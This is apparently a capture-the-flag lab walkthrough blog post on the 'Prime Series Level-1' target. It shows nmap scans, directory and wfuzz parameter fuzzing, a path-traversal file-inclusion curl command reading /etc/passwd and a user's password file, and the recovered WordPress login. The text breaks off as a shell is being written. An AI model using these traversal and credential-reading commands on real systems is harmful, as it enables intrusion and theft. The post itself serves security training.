<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>20240719  Prime_Series_Level-1 | EZTSEC</title><meta name="author" content="Ethan"><meta name="copyright" content="Ethan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="The thought process for this target practice is quite intricate, requiring in-depth directory scanning, learning the use of web fuzzing, and studying the exploitation of file inclusion vulnerabilities">
<meta property="og:type" content="article">
<meta property="og:title" content="20240719  Prime_Series_Level-1">
<meta property="og:url" content="http://eztsec.xyz/2024/07/31/20240719-Prime-Series-Level-1/index.html">
<meta property="og:site_name" content="EZTSEC">
<meta property="og:description" content="The thought process for this target practice is quite intricate, requiring in-depth directory scanning, learning the use of web fuzzing, and studying the exploitation of file inclusion vulnerabilities">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://eztsec.xyz/img/9.jpg">
<meta property="article:published_time" content="2024-07-31T15:59:58.000Z">
<meta property="article:modified_time" content="2024-08-05T11:42:59.137Z">
<meta property="article:author" content="Ethan">
<meta property="article:tag" content="wordpress">
<meta property="article:tag" content="OpenSSL Decryption">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://eztsec.xyz/img/9.jpg"><link rel="shortcut icon" href="/img/749ffac0c6014f168ef4f265323b4512!400x400.jpeg"><link rel="canonical" href="http://eztsec.xyz/2024/07/31/20240719-Prime-Series-Level-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b144796d7a023ff659b245c79a1bfef9";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '20240719  Prime_Series_Level-1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-05 19:42:59'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/w700d1q75cms.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/9.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="EZTSEC"><span class="site-name">EZTSEC</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">20240719  Prime_Series_Level-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-31T15:59:58.000Z" title="Created 2024-07-31 23:59:58">2024-07-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-08-05T11:42:59.137Z" title="Updated 2024-08-05 19:42:59">2024-08-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Target-Range/">Target Range</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Techniques/">Techniques</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/privilege-escalation/">privilege escalation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/privilege-escalation/Kernel-Privilege-Escalation/">Kernel Privilege Escalation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/privilege-escalation/sudo-Privilege-Escalation/">sudo Privilege Escalation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Target-Range/Advanced-Level-Target-Range/">Advanced Level Target Range</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Techniques/wordpress/">wordpress</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Techniques/OpenSSL-Decryption/">OpenSSL Decryption</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>16mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="20240719  Prime_Series_Level-1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>The thought process for this target practice is quite intricate, requiring in-depth directory scanning, learning the use of web fuzzing, and studying the exploitation of file inclusion vulnerabilities. The difficulty of this target practice is moderate, but for me, it is considered high difficulty. It is worth practicing repeatedly.</p>
<h1 id="20240719-Prime-Series-Level-1"><a href="#20240719-Prime-Series-Level-1" class="headerlink" title="20240719  Prime_Series_Level-1"></a>20240719  Prime_Series_Level-1</h1><h2 id="Host-Discovery"><a href="#Host-Discovery" class="headerlink" title="Host Discovery"></a>Host Discovery</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP --min-rate 10000 192.168.48.0/24</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240719151933-xhcw6w4.png" alt="image">​</p>
<h2 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 10000 192.168.48.134 &gt; 134.txt</span><br><span class="line">nmap -sU -p- --min-rate 10000 192.168.48.134 &gt; 134u.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240719171835-t7jddwj.png" alt="image">​</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240719171952-0lnvzv2.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -Pn -sV -O --min-rate 10000 --script=vuln -p80,22 192.168.48.134 &gt; 134.txt </span><br><span class="line">nmap -sT -Pn -sV -O --min-rate 10000 --script=vuln -p80 192.168.48.135 &gt; 135.txt </span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240719173309-gep0ugq.png" alt="image">​</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240719173343-ywvqkgp.png" alt="image">​</p>
<h2 id="Directory-Scanning"><a href="#Directory-Scanning" class="headerlink" title="Directory Scanning"></a>Directory Scanning</h2><p>Web pages exist, directory scanning is performed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.48.134</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721104426-l4kv8zk.png" alt="image">​</p>
<p>There is a WordPress, but after testing, no vulnerabilities were found on the WordPress front end, so this approach was abandoned. Look at other pages.</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721104643-crgaj9b.png" alt="image">​</p>
<p>This prompt suggests that we should use tools for more in-depth exploration, so gobuster is used for scanning</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.48.134/ -w /usr/share/wordlists/dirb/big.txt -x php,html,htm,txt</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721110942-fxzmjzf.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/dev                  (Status: 200) [Size: 131]</span><br><span class="line">/image.php            (Status: 200) [Size: 147] </span><br><span class="line">/index.php            (Status: 200) [Size: 136]</span><br><span class="line">/secret.txt           (Status: 200) [Size: 412]</span><br></pre></td></tr></table></figure>

<p>Both image.php and index.php only contain an image, access secret.txt</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721111500-70lmh8l.png" alt="image">​</p>
<p>It means that fuzzing can be performed on pages containing php. If the correct parameter is found, the following steps can be followed (see location.txt).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Looks like you have got some secrets.</span><br><span class="line"></span><br><span class="line">Ok I just want to do some help to you.</span><br><span class="line"></span><br><span class="line">Do some more fuzz on every page of php which was finded by you. And if</span><br><span class="line">you get any right parameter then follow the below steps. If you still stuck</span><br><span class="line">Learn from here a basic tool with good usage for OSCP.</span><br><span class="line"></span><br><span class="line">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</span><br><span class="line"></span><br><span class="line">//see the location.txt and you will get your next move//</span><br></pre></td></tr></table></figure>

<p>According to the prompt, you can follow the link to use the tool <a target="_blank" rel="noopener" href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</a></p>
<h4 id="WFUZZ-Usage-Method"><a href="#WFUZZ-Usage-Method" class="headerlink" title="WFUZZ Usage Method"></a>WFUZZ Usage Method</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">====================================================================================</span><br><span class="line"></span><br><span class="line"> #    #  ######  #    #  ######  ######</span><br><span class="line"> #    #  #       #    #      #       #</span><br><span class="line"> #    #  #####   #    #     #       #</span><br><span class="line"> # ## #  #       #    #    #       #</span><br><span class="line"> ##  ##  #       #    #   #       #</span><br><span class="line"> #    #  #        ####   ######  ######</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">====================================================================================</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line">(i) USE WFUZZ TO ENUMERATE CORRECT PARAMETER FOR A PAGE.</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">COMMNAD = wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something</span><br><span class="line"></span><br><span class="line">And the result is given below</span><br><span class="line"></span><br><span class="line">000216:  C=200      70 L	      500 W	    2006 Ch	  &quot;configs&quot;</span><br><span class="line">000200:  C=200      70 L	      500 W	    2006 Ch	  &quot;cm&quot;</span><br><span class="line">000201:  C=200      70 L	      500 W	    2006 Ch	  &quot;cmd&quot;</span><br><span class="line">000195:  C=200      70 L	      500 W	    2006 Ch	  &quot;classified&quot;</span><br><span class="line">000197:  C=200      70 L	      500 W	    2006 Ch	  &quot;client&quot;</span><br><span class="line">000204:  C=200      70 L	      500 W	    2006 Ch	  &quot;coke&quot;</span><br><span class="line">Finishing pending requests...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------</span><br><span class="line">(ii) BUT ABOVE COMMND FAILED IF PAGE ALWAYS RETURN 200(HTTP REPONSE). NOW OUR MODIFIED COMMAND IS  =======&gt;</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">COMMAND = wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hw 500 http://website-ip/index.php?FUZZ=something</span><br><span class="line"></span><br><span class="line">And it will return result which is given below.</span><br><span class="line"></span><br><span class="line">Total requests: 950</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload  </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000357:  C=200      70 L	      500 W	    2006 Ch	  &quot;file&quot;</span><br><span class="line"></span><br><span class="line">Total time: 3.753362</span><br><span class="line">Processed Requests: 950</span><br><span class="line">Filtered Requests: 949</span><br><span class="line">Requests/sec.: 253.1063</span><br><span class="line"></span><br><span class="line">Here we can see C=200(Our HTTP Respone from server). </span><br><span class="line">7 L ==&gt; It means 7 lines return by server. </span><br><span class="line">500 W  ==&gt; It means 19 words total count by wfuzz.</span><br><span class="line">2006 Ch  ==&gt; It means 206 total chars count by wfuzz which is return by server.</span><br><span class="line"></span><br><span class="line">After using filter we can remove wrong parameter from our output and right output with right parameter we get.</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">(*)WORKING WITH FILTERS:                                                                               |   </span><br><span class="line"></span><br><span class="line">(i) If we want to filter words then we used switch --hw (words_lenth. In above example --hw 12)        |</span><br><span class="line">(ii) To filter lenth then we used --hl(In above above example this would be --hl 7)</span><br><span class="line">(iii) For chars we used --hh (In above example this would br --hh 206)                                 |</span><br><span class="line">(iv) For response code we use --hc. And always we attach --hc 404. Because this is common for all.</span><br><span class="line">                                                                                                       |                                            </span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">(iii) USE WFUZZ TO FIND OUT SUBDOMAINS.</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">COMMAND ==&gt;  wfuzz -c -w /usr/share/seclists//usr/share/seclists/Discovery/DNS --hc 404 --hw 617 -u website.com -H &quot;HOST: FUZZ.website.com&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USE filter to reach your actual subdomains like below command.</span><br><span class="line"></span><br><span class="line">COMMAND  ==&gt; wfuzz -c -w /usr/share/seclists//usr/share/seclists/Discovery/DNS --hc 404 --hw 7873 -u hnpsec.com -H &quot;HOST: FUZZ.hnpsec.com&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Fuzz the parameters for &#x2F;image.php and &#x2F;index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404  http://192.168.48.134/image.php?FUZZ</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721140732-5fsdzc3.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 -hh 147 http://192.168.48.134/image.php?FUZZ</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721140928-acyadnl.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://192.168.48.134/index.php?FUZZ</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721141026-c0ez28d.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hh 136 http://192.168.48.134/index.php?FUZZ</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721141058-qi1zqzp.png" alt="image">​</p>
<p>Discovered the file parameter under index.php, combined with&#x2F;&#x2F;see the location.txt and you will get your next move&#x2F;&#x2F;</p>
<p>The access link is</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.48.134/index.php?file=location.txt</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721141647-tesv6cm.png" alt="image">​</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ok well Now you reah at the exact parameter</span><br><span class="line"></span><br><span class="line">Now dig some more for next one</span><br><span class="line">use &#x27;secrettier360&#x27; parameter on some other php page for more fun.</span><br></pre></td></tr></table></figure>

<p>It indicates that the image.php page has the parameter secrettier360</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.48.134/image.php?secrettier360</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721142212-rfw8k5s.png" alt="image">​</p>
<h2 id="Vulnerability-Discovery-："><a href="#Vulnerability-Discovery-：" class="headerlink" title="Vulnerability Discovery:："></a>Vulnerability Discovery:：</h2><h3 id="Arbitrary-File-Inclusion"><a href="#Arbitrary-File-Inclusion" class="headerlink" title="Arbitrary File Inclusion"></a>Arbitrary File Inclusion</h3><p>Based on the prompt, this location is correct, so you can try an arbitrary file inclusion (the idea is a bit far-fetched, can’t guess it’s an arbitrary file inclusion vulnerability)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.48.134/image.php?secrettier360=../../../../../../etc/passwd </span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721145346-wjf2d2c.png" alt="image">​</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721145428-4c36m4x.png" alt="image">​</p>
<p>User victor can log in</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721151042-21omcvo.png" alt="image">​</p>
<p>View the password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.48.134/image.php?secrettier360=../../../../../../home/saket/password.txt</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721151204-h2mxasl.png" alt="image">​</p>
<p>Try to log in via ssh, failed. WordPress has a login interface, you can try to log in</p>
<p>Account: victor</p>
<p>Password: follow_the_ippsec</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721151549-ghtv3wo.png" alt="image">​</p>
<h3 id="WordPress-backend-vulnerability"><a href="#WordPress-backend-vulnerability" class="headerlink" title="WordPress backend vulnerability"></a>WordPress backend vulnerability</h3><p>Login successful, there is a vulnerability in the WordPress backend that can be exploited, and methods for exploiting WordPress vulnerabilities will be updated later</p>
<p>​<img src="/2024/07/31/20240719-Prime-Series-Level-1/image-20240721161454-mvljxbz.png" alt="image">​</p>
<p>Write a shell, there is a pit point here, some pages do not have the update file button, the file cannot be saved, and it cannot be written. You need to find a file with an update file button</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 